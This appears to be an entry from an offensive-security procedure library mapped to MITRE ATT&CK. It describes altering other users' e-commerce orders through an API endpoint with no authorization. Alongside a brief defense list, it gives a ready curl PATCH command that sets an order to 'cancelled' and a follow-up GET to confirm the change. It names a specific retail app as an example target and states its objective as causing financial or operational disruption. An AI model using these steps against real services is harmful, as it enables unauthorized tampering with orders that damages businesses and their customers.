---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
tags:
  - broken-access-control
  - data-manipulation
  - api
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Impact]]'
commands:
  - '[[commands/curl-patch-order-status]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Data Manipulation]]'
updated_at: '2025-12-14T17:30:17.904Z'
skill_level: beginner
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Impact]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Data Manipulation]]'
---
---

# Modify-Order-Status-via-Unprotected-Endpoint

## Summary

This procedure leverages a broken access control vulnerability in a web API to unauthorizedly change order statuses, potentially causing business disruptions like fraudulent cancellations or premature shipments.

## Description

Targeting an e-commerce API endpoint without authorization enforcement (e.g., /api/v1/orders/{id}), this procedure allows attackers to issue PATCH requests to update order statuses. In applications like Azbuka Vkusa, this can lead to altering orders owned by other users, disrupting workflows and enabling abuse. Prerequisites include endpoint discovery and a valid order ID; no credentials are needed due to the flaw.

## Requirements

1. Network access to the target API.
2. Valid order ID from prior enumeration.
3. Knowledge of accepted status values (e.g., 'cancelled', 'shipped').
4. HTTP client like curl for sending requests.

## Defense

Defensive measures and detection strategies:

- Enforce ownership checks (e.g., verify user ID matches requestor) on mutation endpoints.
- Audit logs for unauthorized PATCH/POST requests and alert on status changes.
- Implement idempotency keys to prevent replay attacks.
- Use API gateways with policy enforcement for access control.

## Objectives

1. Alter order status to disrupt legitimate business processes.
2. Demonstrate escalation from disclosure to modification.
3. Cause potential financial or operational impact.

## Instructions

### Step 1: Send Update Request

**Context**: Target the order endpoint with a PATCH to change status. Use JSON payload for the update.

**Command** ([[commands/curl-patch-order-status]]):
```bash
curl -X PATCH "https://target-app.com/api/v1/orders/12345" -H "Content-Type: application/json" -d '{"status": "cancelled"}' -v
```

> The command updates the status to 'cancelled'. Verbose output shows 200 OK if successful, with no auth challenges. Failure would be 4xx/5xx, but vulnerability ensures success.

### Step 2: Verify the Change

**Context**: Re-query the order to confirm modification.

**Command** ([[commands/curl-patch-order-status]]):
```bash
curl -X GET "https://target-app.com/api/v1/orders/12345" -H "Content-Type: application/json" | jq '.status'
```

> Extract the status field; expected output: "cancelled", confirming the unauthorized change.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Impact]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Data Manipulation]]

### Sub-Techniques


## Commands Used

- [[commands/curl-patch-order-status]]

## Tools Used


## Tags

- [[broken-access-control]]
- [[data-manipulation]]
- [[api]]

---
